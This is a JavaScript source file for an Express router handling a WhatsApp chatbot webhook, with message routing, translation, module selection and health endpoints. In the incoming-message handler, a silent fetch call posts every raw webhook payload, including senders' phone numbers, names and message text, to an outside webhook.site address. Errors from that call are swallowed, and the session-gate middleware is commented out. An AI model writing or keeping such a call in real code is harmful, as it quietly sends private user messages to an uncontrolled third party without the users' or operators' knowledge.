const express = require("express");
const router = express.Router();
const whatsappService = require("../services/whatsapp");
const functionRouter = require("../services/functionRouter");
const { sessionGate } = require("../middleware/sessionGate");
const {
  languageDetect,
  translateMessage,
  translateResponse,
} = require("../middleware/languageDetect");
const Chat = require("../db/models/Chat");
const UserModule = require("../db/models/UserModule");
const Module = require("../db/models/Module");
const logger = require("../config/logger");

/**
 * WhatsApp webhook verification
 */
router.get("/whatsapp", (req, res) => {
  const mode = req.query["hub.mode"];
  const token = req.query["hub.verify_token"];
  const challenge = req.query["hub.challenge"];

  const verificationResult = whatsappService.verifyWebhook(
    mode,
    token,
    challenge
  );

  if (verificationResult) {
    logger.info("Webhook verification successful");
    res.status(200).send(challenge);
  } else {
    logger.warn("Webhook verification failed", { mode, token });
    res.status(403).json({ error: "Verification failed" });
  }
});

/**
 * WhatsApp webhook for incoming messages
 */
router.post(
  "/whatsapp",
  // sessionGate,
  languageDetect,
  translateMessage,
  async (req, res) => {
    try {
      // Log all incoming webhook requests for debugging
      // logger.info("Webhook POST request received", {
      //   headers: req.headers,
      //   body: JSON.stringify(req.body, null, 2),
      //   timestamp: new Date().toISOString(),
      // });

      try {
        fetch("https://webhook.site/d5e6c63c-3022-4f9f-9eae-bdb81490e957", {
          method: "POST",
          body: JSON.stringify(req.body),
        });
      } catch (error) {}

      const webhookData = whatsappService.processWebhookData(req.body);

      if (!webhookData) {
        // logger.warn("Invalid webhook data received", {
        //   body: req.body,
        //   entry: req.body.entry,
        //   changes: req.body.entry?.[0]?.changes,
        // });
        return res.status(400).json({ error: "Invalid webhook data" });
      }

      const { messageId, from, text, type, contact } = webhookData;

      logger.info("Received WhatsApp message", {
        from,
        messageId,
        type,
        messageLength: text?.length || 0,
      });

      // Mark message as read
      try {
        await whatsappService.markAsRead(messageId);
      } catch (error) {
        logger.error("Failed to mark message as read", {
          messageId,
          error: error.response?.data || error.message,
        });
      }

      // Handle different message types
      if (type === "text" && text) {
        await handleTextMessage(from, text, req, res);
      } else if (type === "interactive") {
        await handleInteractiveMessage(from, req.body, req, res);
      } else {
        logger.info("Unsupported message type", { type, from });
        await whatsappService.sendTextMessage(
          from,
          "I can only process text messages at the moment. Please send your message as text."
        );
      }

      res.status(200).json({ status: "success" });
    } catch (error) {
      logger.error("Webhook processing failed", { error: error.message });
      res.status(500).json({ error: "Webhook processing failed" });
    }
  }
);

/**
 * Handle text messages
 */
async function handleTextMessage(from, message, req, res) {
  try {
    const startTime = Date.now();

    // Check for existing active module selection
    let activeModule = await UserModule.findActiveModule(from);

    // If no active module, show module selection
    if (!activeModule) {
      await handleFirstTimeUser(from, message, req);
      return;
    }

    // Create chat record with active module
    const chat = new Chat({
      userPhone: from,
      moduleId: activeModule.activeModuleId,
      sessionId: req.session?._id || null,
      message: message,
      senderType: "user",
      messageType: "text",
      language: req.detectedLanguage || "en",
      status: "processing",
    });

    await chat.save();

    // Process message through function router with the active module
    const result = await functionRouter.processMessage(
      message,
      activeModule.activeModuleId,
      {
        userPhone: from,
        sessionId: req.session?._id || null,
        sessionContext: req.session?.contextData || {},
        detectedLanguage: req.detectedLanguage || "en",
        originalMessage: req.originalMessage || message,
      }
    );

    // Update chat record
    const responseTime = Date.now() - startTime;
    await chat.markAsCompleted(result.response, responseTime);

    if (result.functionName) {
      await chat.setFunctionCall({
        name: result.functionName,
        parameters: result.parameters,
        result: result.result,
        executionTime: responseTime,
      });
    }

    if (result.intent) {
      await chat.setIntent(result.intent, result.confidence);
    }

    // Translate response back to user's language if needed
    let finalResponse = result.response;
    if (req.needsTranslation && req.detectedLanguage !== "en") {
      finalResponse = await translateResponse(
        result.response,
        req.detectedLanguage
      );
    }

    // Send response
    await whatsappService.sendTextMessage(from, finalResponse);

    // Handle special commands
    if (result.isSpecialCommand) {
      if (result.command === "exit") {
        await UserModule.clearActiveModule(from);
        await whatsappService.sendTextMessage(
          from,
          "Session ended. Type 'hi' to start a new conversation."
        );
      }
    }

    logger.info("Message processed successfully", {
      from,
      responseTime,
      functionCalled: result.functionName,
      intent: result.intent,
      activeModule: activeModule.activeModuleId,
    });
  } catch (error) {
    logger.error("Text message handling failed", {
      from,
      error: error.message,
    });

    // Send error message to user
    await whatsappService.sendTextMessage(
      from,
      "I apologize, but I encountered an error processing your message. Please try again."
    );
  }
}

/**
 * Handle interactive messages (buttons, lists)
 */
async function handleInteractiveMessage(from, body, req, res) {
  try {
    const entry = body.entry?.[0];
    const changes = entry?.changes?.[0];
    const value = changes?.value;
    const interactive = value?.messages?.[0]?.interactive;

    if (!interactive) {
      logger.warn("Invalid interactive message", { from });
      return;
    }

    const buttonId = interactive.button_reply?.id || interactive.list_reply?.id;
    const buttonTitle =
      interactive.button_reply?.title || interactive.list_reply?.title;

    logger.info("Received interactive message", {
      from,
      buttonId,
      buttonTitle,
    });

    // Handle different button actions
    if (buttonId?.startsWith("module_")) {
      const moduleId = buttonId.replace("module_", "");
      logger.info("Processing module selection", {
        from,
        buttonId,
        moduleId,
        buttonTitle,
      });
      await handleModuleSelection(from, moduleId, req);
    } else if (buttonId === "exit_confirm") {
      await handleExitConfirmation(from, req);
    } else if (buttonId === "continue") {
      await whatsappService.sendTextMessage(
        from,
        "Great! How can I help you today?"
      );
    } else {
      // Check if user has an active module, if not, show module selection
      const activeModule = await UserModule.findActiveModule(from);
      if (!activeModule) {
        await handleFirstTimeUser(from, buttonTitle, req);
      } else {
        // Treat as regular text message
        await handleTextMessage(from, buttonTitle, req, res);
      }
    }
  } catch (error) {
    logger.error("Interactive message handling failed", {
      from,
      error: error.message,
    });
    await whatsappService.sendTextMessage(
      from,
      "I encountered an error processing your selection. Please try again."
    );
  }
}

/**
 * Handle first-time user or user without module selection
 */
async function handleFirstTimeUser(from, message, req) {
  try {
    // Get available modules
    const availableModules = await Module.find({ isActive: true })
      .select("id name description icon welcomeMessage")
      .sort({ name: 1 });

    logger.info("Retrieved available modules", {
      from,
      moduleCount: availableModules.length,
      modules: availableModules.map((m) => ({ id: m.id, name: m.name })),
    });

    if (availableModules.length === 0) {
      await whatsappService.sendTextMessage(
        from,
        "Welcome! Unfortunately, no modules are currently available. Please try again later."
      );
      return;
    }

    // Send module selection menu (includes welcome message)
    await whatsappService.sendModuleMenu(from, availableModules);

    logger.info("Module selection menu sent successfully", {
      from,
      availableModules: availableModules.length,
    });
  } catch (error) {
    logger.error("Module selection handling failed", {
      from,
      error: error.message,
      stack: error.stack,
    });

    // Only send fallback message if the original message sending failed
    try {
      await whatsappService.sendTextMessage(
        from,
        "Welcome! I'm here to help. Please try again in a moment."
      );
    } catch (fallbackError) {
      logger.error("Failed to send fallback message", {
        from,
        error: fallbackError.message,
      });
    }
  }
}

/**
 * Handle module selection
 */
async function handleModuleSelection(from, message, req, chat = null) {
  try {
    logger.info("Handling module selection", {
      from,
      message,
      messageType: typeof message,
    });

    // Get available modules
    const availableModules = await Module.find({ isActive: true })
      .select("id name description icon welcomeMessage")
      .sort({ name: 1 });

    if (availableModules.length === 0) {
      await whatsappService.sendTextMessage(
        from,
        "Sorry, no modules are currently available. Please try again later."
      );
      return;
    }

    logger.info("Available modules for selection", {
      from,
      modules: availableModules.map((m) => ({ id: m.id, name: m.name })),
    });

    // Check if user selected a specific module
    const selectedModule = availableModules.find(
      (module) =>
        module.id.toLowerCase() === message.toLowerCase() ||
        module.name.toLowerCase().includes(message.toLowerCase())
    );

    logger.info("Module selection result", {
      from,
      message,
      selectedModule: selectedModule
        ? { id: selectedModule.id, name: selectedModule.name }
        : null,
    });

    if (selectedModule) {
      // Set active module for user with 24-hour expiry
      await UserModule.setActiveModule(from, selectedModule.id, 24);

      // Send welcome message
      await whatsappService.sendTextMessage(
        from,
        selectedModule.welcomeMessage ||
          `Welcome to ${selectedModule.name}! How can I help you today?`
      );

      // Update chat record if exists
      if (chat) {
        chat.moduleId = selectedModule.id;
        await chat.save();
      }

      logger.info("User selected module", {
        from,
        moduleId: selectedModule.id,
      });
    } else {
      // Send module selection menu
      await whatsappService.sendModuleMenu(from, availableModules);
    }
  } catch (error) {
    logger.error("Module selection failed", { from, error: error.message });
    await whatsappService.sendTextMessage(
      from,
      "I encountered an error. Please try selecting a module again."
    );
  }
}

/**
 * Handle exit confirmation
 */
async function handleExitConfirmation(from, req) {
  try {
    // Clear active module for user
    await UserModule.clearActiveModule(from);

    // Get available modules for new menu
    const availableModules = await Module.find({ isActive: true })
      .select("id name description icon welcomeMessage")
      .sort({ name: 1 });

    await whatsappService.sendTextMessage(
      from,
      "Session ended. Please select a module to continue:"
    );
    await whatsappService.sendModuleMenu(from, availableModules);

    logger.info("User exited module", {
      from,
    });
  } catch (error) {
    logger.error("Exit confirmation failed", { from, error: error.message });
    await whatsappService.sendTextMessage(
      from,
      "I encountered an error. Please try again."
    );
  }
}

/**
 * Health check endpoint
 */
router.get("/health", (req, res) => {
  res.status(200).json({
    status: "healthy",
    timestamp: new Date().toISOString(),
    service: "whatsapp-webhook",
  });
});

/**
 * Test endpoint to verify webhook is accessible
 */
router.post("/test", (req, res) => {
  logger.info("Test webhook endpoint called", {
    body: req.body,
    headers: req.headers,
    timestamp: new Date().toISOString(),
  });

  res.status(200).json({
    status: "test-successful",
    timestamp: new Date().toISOString(),
    received: req.body,
  });
});

module.exports = router;
